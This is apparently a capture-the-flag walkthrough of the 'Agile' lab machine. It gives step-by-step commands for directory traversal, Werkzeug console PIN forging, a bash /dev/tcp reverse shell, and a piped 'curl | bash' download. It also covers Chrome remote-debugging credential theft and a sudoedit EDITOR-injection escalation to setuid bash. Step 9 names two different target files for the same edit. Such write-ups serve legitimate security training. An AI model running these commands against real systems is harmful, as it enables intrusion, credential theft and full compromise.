<h2> Target: 10.10.11.203 Agile </h2>

<b>Initial Access:</b><br>
Step 1: nmap -Pn --min-rate=5000 10.10.11.203 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap shows that we have open ports 22 and 80

Step 2: Enumerate these open ports further with nmap: nmap -Pn --min-rate=5000 10.10.11.203 -p 22,80 -sC -sV -oN nmap-agile                  

![image](https://user-images.githubusercontent.com/93153300/234539285-74728dfc-cf82-40c7-85ce-1d53baaa6adf.png) 

Step 3: Nmap shows a redirect to superpass.htb.  In order to connect to the site add into the file /etc/hosts: 10.10.11.203    superpass.htb

Step 4: Navigating to http://superpass.htb shows: 

![image](https://user-images.githubusercontent.com/93153300/234539337-cfc24719-a186-4cc2-8c6f-85af1f190ecf.png)

Click on ‘Login’ in the top right corner of the site.  Then click on ‘Register’ to register an account with any username and password (I used johnwick for username and password).  

Step 5: After logging in with the new registered account the page shows: 

![image](https://user-images.githubusercontent.com/93153300/234539386-a93fe7a5-d903-4e57-ae23-a663f5fdd4ea.png)

Click on ‘Add a password’, fill out the input fields that appear,  click on ‘Export’, and capture the ‘Export’ request in burp suite.  Looking in the ‘Export’ captured requests in burp suite we find a request to http://superpass.htb/download?fn=johnwick_export_8472a60ce0.csv: 

![image](https://user-images.githubusercontent.com/93153300/234539443-c1b534af-8669-4eee-9ba1-40f75b659abd.png) 

Step 6: Check for directory traversal by chaning the ?fn=johnwick_export_8472a60ce0.csv with  ?fn=../../../../etc/passwd:

![image](https://user-images.githubusercontent.com/93153300/234539491-f5b91850-6a80-4e78-944f-686b905f8b25.png)

The response confirms that we found directory traversal as it lists the contents of the file /etc/passwd.  

Step 7: Use the directory traversal to see what else we can find.  Using the directory traversal to /../ shows:


![image](https://user-images.githubusercontent.com/93153300/234539557-df020ebf-85ac-41d6-8e19-c03aa2f3c1ff.png)
 
The response shows an error that says the app is using werkzeug debugger.  Navigating to the webpage http://superpass.htb/download?fn=/../ shows:

![image](https://user-images.githubusercontent.com/93153300/234539598-42186ac0-7fde-411c-87c2-8704ef4db388.png) 

Step 8:  Hovering the mouse over the right hand side of any of these lines will show a little terminal console picture.  Clicking on the little terminal console picture shows: 

![image](https://user-images.githubusercontent.com/93153300/234539655-9a8df4a1-6eeb-4b2e-8b27-fc1259d53ad8.png)

Step 9: In order to use the console we need to unlock it with a pin.  A simple google search for ‘werkzeug pin exploit’ will find plenty of explanations on how to do this.  I will keep this brief, if you’d like to dive into this further and understand how this works you can refer to:  <br>
https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/ <br>
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

To get the pin we need to find the following pieces of information:

A: Absolute path to app.py.  This can be found using the werkzeug error page at http://superpass.htb/download?fn=/../

![image](https://user-images.githubusercontent.com/93153300/234539598-42186ac0-7fde-411c-87c2-8704ef4db388.png) 

The absolute path shown is:  app/venv/lib/python3.10/site-packages/flask/app.py

B: Username of the user running the Flask application.  This can be found using the directory traversal to /proc/self/environ:

![image](https://user-images.githubusercontent.com/93153300/234539692-8a5b8434-cc91-4b6f-9da8-fe0e9a5d2e32.png) 

The user running the Flask application is www-data.

C: Module name of the Flask application.  This is publicly known, it can be found with a simple google search.  I found them on https://www.bengrewell.com/cracking-flask-werkzeug-console-pin and https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug.

Module name of the Flask application: Either flask.app or werkzeug.debug.

D: The application name of the Flask application.  This is publicly known, it can be found with a simple google search.  I found them on   https://www.bengrewell.com/cracking-flask-werkzeug-console-pin and https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug.

Application name of the Flask application: Either Flask, wgi_app, or DebuggedApplication.

E: MAC address of the network interface hosting the application (in decimal form).

First we need to find the network interface used.   This can be found using the directory traversal to /proc/net/arp/:  

![image](https://user-images.githubusercontent.com/93153300/234539736-a1b7ba4b-15e9-4395-86a2-035e782e78a8.png) 

The response shows the network interface is eth0.  Now we can find the mac address using the directory traversal to /sys/class/net/eth0/address:

![image](https://user-images.githubusercontent.com/93153300/234539761-87574b0a-2eb7-492b-ba8d-67f92ed0fa3e.png) 
 
The response shows the mac address: 00:50:56:b9:5d:ae

Finally, convert the mac address to decimal from.  We can do this using python.  Make sure to remove the colons and put a 0x at the beginning of the mac address: python -c ‘print(0x005056b95dae)’.  Python outputs 345052372398.

F: Machine id: This is a combination of two things.  The first part can be found using the directory traversal to /etc/machine-id:

![image](https://user-images.githubusercontent.com/93153300/234539850-5db977a6-5433-4c27-81f8-0e4aa0204880.png) 

The response shows: ed5b159560f54721827644bc9b220d00. 

The second part we need can be found using the directory traversal to /proc/self/cgroup: 

![image](https://user-images.githubusercontent.com/93153300/234539911-76c806c3-7a00-498d-9422-2ea00935ef4c.png) 

The part we need from the response is found after the last forward slash: superpass.service

Finally, add the superpass.service to the end of the /etc/machine-id: ed5b159560f54721827644bc9b220d00superpass.service
 
Step 10: Insert the information we found from step 9 into the source code for the werkzeug pin generator.  The source code for the werkzeug pin generator and instructions of exactly where to insert each piece of information can be found with a simple google search.  I used https://www.bengrewell.com/cracking-flask-werkzeug-console-pin and https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug.  

Since we do have a few options as to what is the correct ‘modname’ and the ‘name of the Flask application’, we will have to generate the pin for each option because a different ‘modname’ or a different ‘name of the Flask application’ will generate different pin values.  

Luckily, there is a script written on https://www.bengrewell.com/cracking-flask-werkzeug-console-pin that does this automatically for us and outputs all the possible pins.  Running the script shows: 
 
![image](https://user-images.githubusercontent.com/93153300/234539939-b16d2066-a034-4b88-9bee-774897fadfef.png) 
  
Insert the pin on the page ‘http://superpass.htb/download?fn=/../’ and see if it’s accepted:

![image](https://user-images.githubusercontent.com/93153300/234539655-9a8df4a1-6eeb-4b2e-8b27-fc1259d53ad8.png)

The first pin worked: 466-266-588.  

Step 11: Now that we have the werkzeug debugger to execute commands, open a netcat/pwncat listener to catch the reverse shell: pwncat-cs -lp 443

Next, enter the following code in the werkzeug debugger console to get a reverse shell:  __import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.85/443 0>&1"');

We have shell as www-data
____________________________________________
<b>Lateral Movement To User Corum:</b><br>
Step 1: Look at /etc/passwd to see the usernames on the target that have /bin/bash or /bin/sh shell:
 
![image](https://user-images.githubusercontent.com/93153300/234539979-482cd2cf-5ee5-4b96-bab4-f25843d1d2c6.png) 

The usernames we find are root, corum, runner, edwards, and dev_admin.  

Step 2: Looking around we find a file that contains credentials ‘superpassuser:dSA6l7q*yIVs$39Ml6ywvgK’:

![image](https://user-images.githubusercontent.com/93153300/234540016-02cd68dd-5067-4e3e-8557-81d6eddeeae0.png) 

Use these credentials to log into mysql: mysql -u superpassuser -p → enter password when prompted.

Step 3: Find the database names using the command: show databases;

![image](https://user-images.githubusercontent.com/93153300/234540063-0d02d996-1d62-4d4c-969c-09379c3617c8.png) 
 
Select database ‘superpass’ using command: use superpass;

Step 4: Find the table names using the command: show tables;

![image](https://user-images.githubusercontent.com/93153300/234540096-31c2a1f3-d1fa-468b-96c6-c47fb5887b01.png)

Step 5: Dump the ‘passwords’ table using the command: select * from passwords;

![image](https://user-images.githubusercontent.com/93153300/234540128-bea0fe2f-e7cc-4d18-a5d6-5a5afc1f3170.png) 
  
This shows passwords for username corum which is one of the usernames found in /etc/passwd.  

Step 6: Try to ssh into the username corum using the newest password shown for corum which is ‘5db7caa1d13cc37c9fc2’: ssh corum@superpass.htb  → enter the password when prompted

We have shell as username corum.  We can get the flag in /home/corum/user.txt
_____________________________________________________
<b>Lateral Movement To User Edwards:</b><br>
Step 1: Download linpeas.sh from https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS 

Step 2: Open a python webserver on our local pc in the directory where we have linpeas stored.   

Step 3: On the target shell, run the command: curl http://enter-your-ip-address/linpeas | bash

Running linpeas shows:

![image](https://user-images.githubusercontent.com/93153300/234540157-fbb1ac30-d45a-4a38-9c70-a96e8ed5b9f3.png)

Seems that there is likely an attack we can use on the targets process of chrome that uses‘--remote-debugging-port=41829’.  Further down in the linpeas output we see that port 41829 is not open to the public, but it is open to localhost (127.0.0.1): 

![image](https://user-images.githubusercontent.com/93153300/234540188-8ab63124-649b-4d84-8a05-d0b10f1163b3.png) 
 
Step 4: Google search ‘exploit --remote-debugging-port’  finds plenty of explanations on this attack.  Follow the below instructions to perform the attack:

A: Perform ssh port forwarding to 127.0.0.1:41829 by typing: ~C →  enter → -L 41829:127.0.0.1:41829 → enter

B: Open a chrome browser and type in the url field: chrome://inspect/#devices

The chrome browser shows: 

![image](https://user-images.githubusercontent.com/93153300/234540218-7562bddd-80cb-4bdd-b2d0-690eb8ece5b1.png) 

C: Click on ‘Configure’, insert into the input field ‘localhost:41829’, and then click on ‘Done’. 

D: The chrome page will show at the bottom, under ‘Remote Target’ something that didn’t appear before:

![image](https://user-images.githubusercontent.com/93153300/234540257-dccc907e-3cc4-45b2-be38-ad7a912cfaca.png) 
 
Clicking on ‘inspect’ shows:

![image](https://user-images.githubusercontent.com/93153300/234540303-d43c32ff-ed6e-4bb0-b8c0-b46cee3b6988.png) 

E: Click on ‘Vault’ at the top.  The chrome page shows:


![image](https://user-images.githubusercontent.com/93153300/234540365-48577479-bce0-4de9-a7de-3537b6d37818.png) 

The page shows credentials of ‘Edwards:d07867c6267dcb5df0af’ and ‘dedwards_ _:7dbfe676b6b564ce5718’.

Step 5: Use the ‘edwards’ credentials to ssh into user edwards: ssh edwards@superpass.htb → enter the password when promted.

We have shell as user edwards.
__________________________________________________________
<b>Privilege Escalation:</b><br>
Step 1: Sudo -l shows:

![image](https://user-images.githubusercontent.com/93153300/234556691-218c4776-1a13-40e3-847b-3c13ee7c0edb.png) 
  
This shows that we have permission to run sudoedit as user dev_admin to read two files: /app/config_test.json and /app/app-testing/tests/functional/creds.txt.

We can open these files using the command: ‘sudoedit -u dev_admin /app/config_test.json’ and ‘sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt’

Reading these two files shows credentials, but these credentials seem to be a rabbit hole.

Step 2: Check sudoedit version using command: sudoedit --version

![image](https://user-images.githubusercontent.com/93153300/234556729-bc6dcc3b-15e3-4589-99de-17597af58742.png) 

Step 3: Google search ‘sudoedit 1.9.9 exploit’ finds an exploitdb 51217
and many articles explaining how to exploit this version.  Download the exploit using command: searchsploit -m 51217.  

Step 4: Reading the source code to 51217 reveals that the vulnerability in this version of sudoedit allows us to use sudoedit to open any file as the elevated user instead of just the specified files in sudo -l.   

We can’t just run 51217 because the exploit deals with having sudoedit as root while we have sudoedit as dev_admin.  Therefore, we will exploit this manually.  

Step 5: On the target shell run the command: EXPLOITABLE='sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt'

This will set the environment variable ‘$EXPLOITABLE’  to  sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt.

Step 6: We do not have access to read or write /home/dev_admin/.bashrc.  Therefore, if we run the command vim /home/dev_admin/.bashrc then we get an error response saying permission denied.  However, using the sudoedit exploit we found we can get access to read and write this file.  

Run the command: EDITOR="vim -- /home/dev_admin/.bashrc" $EXPLOITABLE

This command opens /home/dev_admin/.bashrc with read and write privileges.  
  
Step 7: Now that we know that we can write to any file that user dev_admin has write permissions on, let’s find what files dev_admin has write access to.  A quick and easy way to find these files is to run the command: find / -group dev_admin -ls 2>/dev/null.  

![image](https://user-images.githubusercontent.com/93153300/234556764-50a225da-3fab-4d67-906d-d479ca752b6c.png)  

We find that dev_admin has write permissions on /app/venv/bin/activate which is a file that is owned by user root.  

Step 8: Even if we write to /app/venv/bin/activate we won’t be able to execute it as an elevated user, so check if their are any automatic processes running.  Pspy will show what automatic processes/crontabs are running on the target.  We can download the binary from github: https://github.com/DominicBreuker/pspy

Upload pspy to the target and run it.  Running pspy shows that their is a process run by root every minute:

![image](https://user-images.githubusercontent.com/93153300/234556797-59c94177-6514-43b8-967e-5cd0a8936473.png)
 
Step 9: We know from the previous step that dev_admin has write permissions to /app/venv/bin/activate.  Use sudoedit exploit to edit ‘/app/venv/bin/activate’ to include the command ‘chmod 4755 /bin/bash’.

To do this, first run the command: EXPLOITABLE='sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt’

Next, run the command: EDITOR="vim -- /app/venv/bin/activate" $EXPLOITABLE

This will open the file /home/dev_admin/.bashrc with read and write permissions.  

Finally, add in /home/dev_admin/.bashrc the command: chmod 4755 /bin/bash:

![image](https://user-images.githubusercontent.com/93153300/234556822-6949976a-91ae-441c-87a4-3e5d4cc96304.png)

Save the file and close it by typing in vim:   :wq

Step 10: After a minute check if the process ran and has changed the /bin/bash file permissions to suid.  We can check this by running the command: ls -al /bin/bash:

![image](https://user-images.githubusercontent.com/93153300/234556845-5efc38be-39f0-421d-bcff-eb9ba471f9a8.png)
 
This confirms that /bin/bash file permissions have changed to suid. 

Step 11: Run the command: /bin/bash -p

We have shell as root.  We can get the flag in /root/root.txt
